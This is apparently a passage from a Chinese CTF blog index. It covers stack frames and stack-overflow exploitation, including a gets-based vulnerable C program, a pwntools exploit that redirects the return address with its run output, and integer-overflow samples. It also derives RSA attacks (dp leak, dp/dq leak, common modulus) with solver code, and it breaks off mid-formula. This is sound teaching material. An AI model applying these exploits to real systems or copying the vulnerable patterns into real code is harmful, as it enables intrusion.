alt=\"reg\"><figcaption aria-hidden=\"true\">reg</figcaption>\r\n</figure>\r\n<h4 id=\"栈帧结构\">栈帧结构</h4>\r\n<p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p>\r\n<p>编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p>\r\n<p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/PWN/image-20220913172411988.png\" alt=\"func_stack\"><figcaption aria-hidden=\"true\">func_stack</figcaption>\r\n</figure>\r\n<h4 id=\"堆栈操作\">堆栈操作</h4>\r\n<p>函数调用时的具体步骤如下：</p>\r\n<ol type=\"1\">\r\n<li>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</li>\r\n<li>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</li>\r\n<li>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</li>\r\n<li>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</li>\r\n<li>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</li>\r\n<li>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</li>\r\n<li>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</li>\r\n<li>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</li>\r\n<li>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</li>\r\n</ol>\r\n<p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p>\r\n<h3 id=\"栈溢出原理\">栈溢出原理</h3>\r\n<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。因此，发生栈溢出的基本前提是：</p>\r\n<ul>\r\n<li>程序必须向栈上写入数据。</li>\r\n<li>写入的数据大小没有被良好地控制。</li>\r\n</ul>\r\n<h4 id=\"示例\">示例</h4>\r\n<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">success</span><span class=\"params\">()</span> &#123; <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">vulnerable</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">12</span>];</span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;</span><br><span class=\"line\">  vulnerable();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行 <strong>success 函数</strong>。</p>\r\n<p><strong>gets</strong>本身是一个<strong>危险函数</strong>。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。</p>\r\n<p>利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数。可以看到</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vulnerable</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [sp+4h] [bp-14h]@1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  gets(&amp;s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>\r\n<pre><code>           +----------------+\r\n           |     retaddr    |\r\n           +----------------+\r\n           |    saved ebp   |\r\n     ebp--&gt;+----------------+\r\n           |                |\r\n           |                |\r\n           |                |\r\n           |                |\r\n           |                |\r\n           |                |\r\ns,ebp-0x14--&gt;+----------------+</code></pre>\r\n<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:0804843B success         proc near</span><br><span class=\"line\">.text:0804843B                 push    ebp</span><br><span class=\"line\">.text:0804843C                 mov     ebp, esp</span><br><span class=\"line\">.text:0804843E                 sub     esp, 8</span><br><span class=\"line\">.text:08048441                 sub     esp, 0Ch</span><br><span class=\"line\">.text:08048444                 push    offset s        ; &quot;You Hava already controlled it.&quot;</span><br><span class=\"line\">.text:08048449                 call    _puts</span><br><span class=\"line\">.text:0804844E                 add     esp, 10h</span><br><span class=\"line\">.text:08048451                 nop</span><br><span class=\"line\">.text:08048452                 leave</span><br><span class=\"line\">.text:08048453                 retn</span><br><span class=\"line\">.text:08048453 success         endp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>如果我们写入的字符串为：<code>0x14*'a'+'bbbb'+success_addr</code></p>\r\n<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>\r\n<pre><code>               +----------------+\r\n               |    0x0804843B  |\r\n               +----------------+\r\n               |       bbbb     |\r\n         ebp--&gt;+----------------+\r\n               |                |\r\n               |                |\r\n               |                |\r\n               |                |\r\n               |                |\r\n               |                |\r\n   s,ebp-0x14-&gt;+----------------+</code></pre>\r\n<p>需要注意的是，在计算机内存中，每个值都是按照字节存储的。X86架构采用小端存储，即 0x0804843B 在内存中的形式是 <strong>3b</strong></p>\r\n<p>可以编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding=utf8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">## 构造与程序交互的对象</span></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./stack_example&#x27;</span>)</span><br><span class=\"line\">success_addr = <span class=\"number\">0x0804843b</span></span><br><span class=\"line\"><span class=\"comment\">## 构造payload</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x14</span> + <span class=\"string\">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span> p32(success_addr)</span><br><span class=\"line\"><span class=\"comment\">## 向程序发送字符串</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"><span class=\"comment\">## 将代码交互转换为手工交互</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>执行代码，可以得到</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜  stack-example python exp.py</span><br><span class=\"line\">[+] Starting local process &#x27;./stack_example&#x27;: pid 61936</span><br><span class=\"line\">;\\x84\\x0</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">aaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0</span><br><span class=\"line\">You Hava already controlled it.</span><br><span class=\"line\">[*] Got EOF while reading in interactive</span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\">[*] Process <span class=\"string\">&#x27;./stack_example&#x27;</span> stopped with <span class=\"built_in\">exit</span> code -11 (SIGSEGV) (pid 61936)</span></span><br><span class=\"line\">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>\r\n<p>可以看到我们确实已经执行 success 函数。</p>\r\n<h4 id=\"栈溢出步骤\">栈溢出步骤</h4>\r\n<ol type=\"1\">\r\n<li><strong>寻找危险函数</strong></li>\r\n</ol>\r\n<p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下：</p>\r\n<ul>\r\n<li>输入\r\n<ul>\r\n<li>gets，直接读取一行，忽略''</li>\r\n<li>scanf</li>\r\n<li>vscanf</li>\r\n</ul></li>\r\n<li>输出\r\n<ul>\r\n<li>sprintf</li>\r\n</ul></li>\r\n<li>字符串\r\n<ul>\r\n<li>strcpy，字符串复制，遇到''停止</li>\r\n<li>strcat，字符串拼接，遇到''停止</li>\r\n<li>bcopy</li>\r\n</ul></li>\r\n</ul>\r\n<ol start=\"2\" type=\"1\">\r\n<li><strong>确定填充长度</strong></li>\r\n</ol>\r\n<p>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>\r\n<ul>\r\n<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>\r\n<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>\r\n<li>直接地址索引，就相当于直接给定了地址。</li>\r\n</ul>\r\n<p>一般来说，我们会有如下的覆盖需求</p>\r\n<ul>\r\n<li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li>\r\n<li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li>\r\n<li>覆盖 bss 段某个变量的内容。</li>\r\n<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>\r\n</ul>\r\n<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>\r\n<p>栈溢出其他类型：ret2text、ret2shellcode、ret2syscall、ret2libc（ROP）、stack-pivoting。</p>\r\n<h3 id=\"例题\">例题</h3>\r\n<h2 id=\"整数溢出\">整数溢出</h2>\r\n<h3 id=\"c语言整数类型\">C语言整数类型</h3>\r\n<p>在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，如下所示:</p>\r\n<table>\r\n<colgroup>\r\n<col style=\"width: 19%\">\r\n<col style=\"width: 14%\">\r\n<col style=\"width: 65%\">\r\n</colgroup>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>类型</th>\r\n<th>字节</th>\r\n<th>范围</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>short int</td>\r\n<td>2字节（word）</td>\r\n<td>0<sub>32767(0</sub>0x7fff) -32768<sub>-1(0x8000</sub>0xffff)</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>unsigned short int</td>\r\n<td>2byte(word)</td>\r\n<td>0<sub>65535(0</sub>0xffff)</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>int</td>\r\n<td>4byte(dword)</td>\r\n<td>0<sub>2147483647(0</sub>0x7fffffff) -2147483648<sub>-1(0x80000000</sub>0xffffffff)</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>unsigned int</td>\r\n<td>4byte(dword)</td>\r\n<td>0<sub>4294967295(0</sub>0xffffffff)</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>long int</td>\r\n<td>8byte(qword)</td>\r\n<td>正: 0~0x7fffffffffffffff 负: 0x8000000000000000~0xffffffffffffffff</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>unsigned long int</td>\r\n<td>8byte(qword)</td>\r\n<td>0~0xffffffffffffffff</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</p>\r\n<h3 id=\"溢出原理\">溢出原理</h3>\r\n<h4 id=\"上界溢出\">上界溢出</h4>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 伪代码</span></span><br><span class=\"line\"><span class=\"type\">short</span> <span class=\"type\">int</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\">a = a + <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 对应的汇编</span><br><span class=\"line\">movzx  eax, word ptr [rbp - 0x1c]</span><br><span class=\"line\">add    eax, 1</span><br><span class=\"line\">mov    word ptr [rbp - 0x1c], ax</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">short</span> <span class=\"type\">int</span> b;</span><br><span class=\"line\"></span><br><span class=\"line\">b = b + <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># assembly code</span><br><span class=\"line\">add    word ptr [rbp - 0x1a], 1</span><br></pre></td></tr></table></figure>\r\n<p>上界溢出有两种情况，一种是 0x7fff + 1， 另一种是 0xffff + 1。</p>\r\n<p>因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在 (编译器的层面才对有符号和无符号进行区分，产生不同的汇编指令)。</p>\r\n<p>所以 add 0x7fff, 1 == 0x8000，这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，0x7fff 表示的是 32767，但是 0x8000 表示的是 -32768，用数学表达式来表示就是在有符号短整型中 32767+1 == -32768。</p>\r\n<p>第二种情况是 add 0xffff, 1，这种情况需要考虑的是第一个操作数。</p>\r\n<p>比如上面的有符号型加法的汇编代码是 add eax, 1，因为 eax=0xffff，所以 add eax, 1 == 0x10000，但是无符号的汇编代码是对内存进行加法运算 add word ptr [rbp - 0x1a], 1 == 0x0000。</p>\r\n<p>在有符号的加法中，虽然 eax 的结果为 0x10000，但是只把 ax=0x0000 的值储存到了内存中，从结果看和无符号是一样的。</p>\r\n<p>再从数字层面看看这种溢出的结果，在有符号短整型中，0xffff==-1，-1 + 1 == 0，从有符号看这种计算没问题。</p>\r\n<p>但是在无符号短整型中，0xffff == 65535, 65535 + 1 == 0。</p>\r\n<h4 id=\"下界溢出\">下界溢出</h4>\r\n<p>下届溢出的道理和上界溢出一样，在汇编代码中，只是把 add 替换成了 sub。</p>\r\n<p>一样也是有两种情况：</p>\r\n<p>第一种是 sub 0x0000, 1 == 0xffff，对于有符号来说 0 - 1 == -1 没问题，但是对于无符号来说就成了 0 - 1 == 65535。</p>\r\n<p>第二种是 sub 0x8000, 1 == 0x7fff，对于无符号来说是 32768 - 1 == 32767 是正确的，但是对于有符号来说就变成了 -32768 - 1 = 32767。</p>\r\n<h3 id=\"示例-1\">示例</h3>\r\n<p>整数溢出的漏洞中，可以总结为两种情况。分别是：<code>未限制范围</code>和<code>错误的类型转换</code></p>\r\n<h4 id=\"未限制范围\">未限制范围</h4>\r\n<p>这种情况很好理解，比如有一个固定大小的桶，往里面倒水，如果你没有限制倒入多少水，那么水则会从桶中溢出来。</p>\r\n<p>一个有固定大小的东西，你没有对其进行约束，就会造成不可预期的后果。</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cat</span> test.c</span><br><span class=\"line\"><span class=\"comment\">#include&lt;stddef.h&gt;</span></span><br><span class=\"line\">int main(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len;</span><br><span class=\"line\">    int data_len;</span><br><span class=\"line\">    int header_len;</span><br><span class=\"line\">    char *buf;</span><br><span class=\"line\"></span><br><span class=\"line\">    header_len = 0x10;</span><br><span class=\"line\">    scanf(<span class=\"string\">&quot;%uld&quot;</span>, &amp;data_len);</span><br><span class=\"line\"></span><br><span class=\"line\">    len = data_len+header_len</span><br><span class=\"line\">    buf = malloc(len);</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(0, buf, data_len);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ gcc test.c</span><br><span class=\"line\">$ ./a.out</span><br><span class=\"line\">-1</span><br><span class=\"line\">asdfasfasdfasdfafasfasfasdfasdf</span><br><span class=\"line\"><span class=\"comment\"># gdb a.out</span></span><br><span class=\"line\">► 0x40066d &lt;main+71&gt;    call   malloc@plt &lt;0x400500&gt;</span><br><span class=\"line\">        size: 0xf</span><br></pre></td></tr></table></figure>\r\n<p>只申请 0x20 大小的堆，但是却能输入 0xffffffff 长度的数据，从整型溢出到堆溢出</p>\r\n<h4 id=\"错误的类型转换\">错误的类型转换</h4>\r\n<p>即使正确的对变量进行约束，也仍然有可能出现整数溢出漏洞，有以下两种情况。</p>\r\n<ol type=\"1\">\r\n<li>范围大的变量赋值给范围小的变量</li>\r\n</ol>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cat</span> test2.c</span><br><span class=\"line\">void check(int n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!n)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;vuln&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;OK&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    long int a;</span><br><span class=\"line\"></span><br><span class=\"line\">    scanf(<span class=\"string\">&quot;%ld&quot;</span>, &amp;a);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a == 0)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Bad&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        check(a);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ gcc test2.c</span><br><span class=\"line\">$ ./a.out</span><br><span class=\"line\">4294967296</span><br><span class=\"line\">vuln</span><br></pre></td></tr></table></figure>\r\n<p>上述代码就是一个范围大的变量 (长整型 a)，传入 check 函数后变为范围小的变量 (整型变量 n)，造成整数溢出的例子。</p>\r\n<p>已经长整型的占有 8 byte 的内存空间，而整型只有 4 byte 的内存空间，所以当 long -&gt; int，将会造成截断，只把长整型的低 4byte 的值传给整型变量。</p>\r\n<p>在上述例子中，就是把 long: 0x100000000 -&gt; int: 0x00000000。</p>\r\n<p>但是当范围更小的变量就能完全的把值传递给范围更大的变量，而不会造成数据丢失。</p>\r\n<ol start=\"2\" type=\"1\">\r\n<li>只做了单边限制</li>\r\n</ol>\r\n<p>这种情况只针对有符号类型</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cat</span> test3.c</span><br><span class=\"line\">int main(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len, l;</span><br><span class=\"line\">    char buf[11];</span><br><span class=\"line\"></span><br><span class=\"line\">    scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;len);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len &lt; 10) &#123;</span><br><span class=\"line\">        l = <span class=\"built_in\">read</span>(0, buf, len);</span><br><span class=\"line\">        *(buf+l) = 0;</span><br><span class=\"line\">        puts(buf);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Please len &lt; 10&quot;</span>);        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ gcc test3.c</span><br><span class=\"line\">$ ./a.out</span><br><span class=\"line\">-1</span><br><span class=\"line\">aaaaaaaaaaaa</span><br><span class=\"line\">aaaaaaaaaaaa</span><br></pre></td></tr></table></figure>\r\n<p>从表面上看，我们对变量 len 进行了限制，但是仔细思考可以发现，len 是有符号整型，所以 len 的长度可以为负数，但是在 read 函数中，第三个参数的类型是 size_t，该类型相当于 unsigned long int，属于无符号长整型。</p>\r\n","categories":["CTF"],"tags":["share","pwn"]},{"title":"RSA 算法各类攻击","url":"/2022/09/12/RSA-%E7%AE%97%E6%B3%95%E5%90%84%E7%B1%BB%E6%94%BB%E5%87%BB/","content":"<h2 id=\"dp泄漏\">dp泄漏</h2>\r\n<h3 id=\"原理\">原理</h3>\r\n<p>基本数学公式 <span class=\"math display\">\\[a = kb + p\\]</span> <span class=\"math display\">\\[a\\mod b = p\\]</span> 已知条件：<span class=\"math inline\">\\(dp, n, e, c\\)</span></p>\r\n<span id=\"more\"></span>\r\n<h3 id=\"rsa的基本公式\">RSA的基本公式</h3>\r\n<p><span class=\"math display\">\\[c \\equiv m^e\\mod n\\]</span> <span class=\"math display\">\\[m \\equiv c^d\\mod n\\]</span> <span class=\"math display\">\\[\\phi ( n ) = ( p - 1 ) \\times ( q - 1 ) \\]</span> <span class=\"math display\">\\[d \\times e \\equiv 1\\mod \\phi( n )\\]</span></p>\r\n<h3 id=\"dp是什么\">dp是什么</h3>\r\n<p><span class=\"math display\">\\[dp \\equiv d\\mod( p − 1 )\\]</span></p>\r\n<h3 id=\"推导过程\">推导过程</h3>\r\n<p>将该公式变形：</p>\r\n<p><span class=\"math display\">\\[dp \\equiv d\\mod ( p − 1 )\\\\\r\n\\Rightarrow dp \\times e\\equiv d \\times e \\mod (p-1)\\\\\r\n\\Rightarrow d \\times e \\equiv k \\times (p-1) + dp \\times e\\]</span></p>\r\n<p>变形后的公式与下式结合</p>\r\n<p><span class=\"math display\">\\[d\\times e \\equiv1mod\\phi (n)\\]</span></p>\r\n<p>因为：</p>\r\n<p><span class=\"math display\">\\[\\phi(n)=(p-1)\\times(q-1)\\]</span></p>\r\n<p>所以我们可以进行变形：</p>\r\n<p><span class=\"math display\">\\[\\Rightarrow d\\times e \\equiv 1\\mod(p-1) \\times (q-1)\\]</span></p>\r\n<p>得到：</p>\r\n<p><span class=\"math display\">\\[ k \\times (p-1) + dp \\times e=1mod\\phi (n)\\]</span></p>\r\n<p>再次变形：</p>\r\n<p><span class=\"math display\">\\[k_1 \\times (p-1) + dp \\times e =1mod (p-1)\\times(q-1)\\]</span></p>\r\n<p>结合：</p>\r\n<p><span class=\"math display\">\\[k_1 \\times (p-1) + dp \\times e = k_2 \\times (p-1) \\times (q-1) +1\\\\\r\n\\Rightarrow dp \\times e = [k_2 \\times (p-1) \\times (q-1) +1] - [k_1 \\times (p-1)]\\\\ \\Rightarrow dp \\times e = [k_2 \\times (q-1) - k_1] \\times (p-1) +1\\]</span></p>\r\n<p>设：<span class=\"math inline\">\\(X = k_2 \\times (q-1) - k_1\\)</span> <span class=\"math display\">\\[\\Rightarrow dp \\times e = X \\times (p-1) +1\\\\\r\n\\Rightarrow dp &lt; p-1\\\\\r\n\\Rightarrow X &lt; e\\\\\r\n\\Rightarrow X \\in (0,e)\\]</span></p>\r\n<h3 id=\"求p\">求P</h3>\r\n<p>遍历X（65537种可能），求出p-1，得到p且能被n整除，接下来便是常规的RSA解法</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">65538</span>):</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (dp*e-<span class=\"number\">1</span>) % i == <span class=\"number\">0</span>:</span><br><span class=\"line\">      p = (dp*e-<span class=\"number\">1</span>)//i+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> n % p == <span class=\"number\">0</span>:</span><br><span class=\"line\">            q = n // p</span><br><span class=\"line\">            phi_n = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">            d = gmpy2.invert(e, phi_n)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\r\n<h2 id=\"dpdq泄漏\">dp,dq泄漏</h2>\r\n<h3 id=\"已知条件\">已知条件</h3>\r\n<p>公式如下：</p>\r\n<p><span class=\"math display\">\\[\\begin{align}\\ c\\equiv m^e\\mod n\\\\\r\nm\\equiv c^d\\mod n\\\\\r\n\\phi(n)=(p-1)\\times(q-1)\\\\\r\nd\\times e\\equiv 1\\mod\\phi(n)\\\\\r\ndp\\equiv d\\mod(p-1)\\\\\r\ndq\\equiv d\\mod(q-1)\\end{align}\\]</span> 已知 <span class=\"math inline\">\\(c,e,dp,dq\\)</span>，求 <span class=\"math inline\">\\(m\\)</span></p>\r\n<h3 id=\"公式推导\">公式推导</h3>\r\n<p>利用中国剩余定理，可以得到</p>\r\n<p><span class=\"math display\">\\[\\begin{align}m_1\\equiv c^d\\mod p\\\\\r\nm_2\\equiv c^d\\mod q\\end{align}\\]</span> 由公式7可得 <span class=\"math display\">\\[\\begin{align}c^d=m_1+p*k\\end{align}\\]</span> 代入公式8，可得 <span class=\"math display\">\\[\\begin{align}m_2\\equiv (m_1+p*k)\\mod q\\end{align}\\]</span> 将两边同时减去<span class=\"math inline\">\\(m_1\\)</span> <span class=\"math display\">\\[\\begin{align}m_2-m_1\\equiv pk\\mod q\\end{align}\\]</span> 因为 <span class=\"math inline\">\\(gcd(p,q)=1\\)</span>，可求p的逆元，得到 <span class=\"math display\">\\[\\begin{align}(m_2-m_1)*p^{-1}\\equiv k\\mod q\\\\\r\n\\Rightarrow k\\equiv (m_2-m_1)*p^{-1}\\mod q\\end{align}\\]</span> 将公式9和公式13合并，得到 <span class=\"math display\">\\[\\begin{align}c^d=((m_2-m_1)*p^{-1}\\mod q)*p+m_1\\end{align}\\]</span> 代入公式2，得到 <span class=\"math display\">\\[\\begin{align}m\\equiv(((m_2-m_1)*p^{-1}\\mod q)*p+m_1)\\mod n\\end{align}\\]</span> 将公式5，6分别代入7，8，得到 <span class=\"math display\">\\[\\begin{align}m_1\\equiv c^{dq\\mod(q-1)}\\mod q\\\\\r\nm_2\\equiv c^{dp\\mod(p-1)}\\mod p\\end{align}\\]</span> 得到 <span class=\"math display\">\\[\\begin{align}m_1\\equiv c^{dq}\\mod q\\\\\r\nm_2\\equiv c^{dp}\\mod p\\end{align}\\]</span> 算出 <span class=\"math inline\">\\(m_1,m_2\\)</span> 后，代入公式15，即可求出 <span class=\"math inline\">\\(m\\)</span></p>\r\n<h3 id=\"求解代码\">求解代码</h3>\r\n<p>编写代码如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">m1 = gmpy2.powmod(c, dq, q)</span><br><span class=\"line\">m2 = gmpy2.powmod(c, dp, p)</span><br><span class=\"line\">m = (((m2-m1) * gmpy2.invert(p, q) % q) * p + m1) % n</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"共模攻击\">共模攻击</h2>\r\n<h3 id=\"已知条件-1\">已知条件</h3>\r\n<p>已知：<span class=\"math inline\">\\(c_1,c_2,e_1,e_2,n\\)</span> <span class=\"math display\">\\[\\begin{align}\r\nc_1=m^{e_1}\\mod n\\\\\r\nc_2 = m^{e_2}\\mod n\r\n\\end{align}\\]</span></p>\r\n<h3 id=\"公式推导-1\">公式推导</h3>\r\n<p>首先假设 <span class=\"math inline\">\\(gcd(e_1,e_2)=1\\)</span>，此时则有 <span class=\"math inline\">\\(k_1*e_1+k_2*e_2=1\\)</span>，可以得到 <span class=\"math display\">\\[\\begin{align*}\r\n(c_1^{k_1}*c_2^{k_2})\\mod n &amp; = ((m^{e_1}\\mod 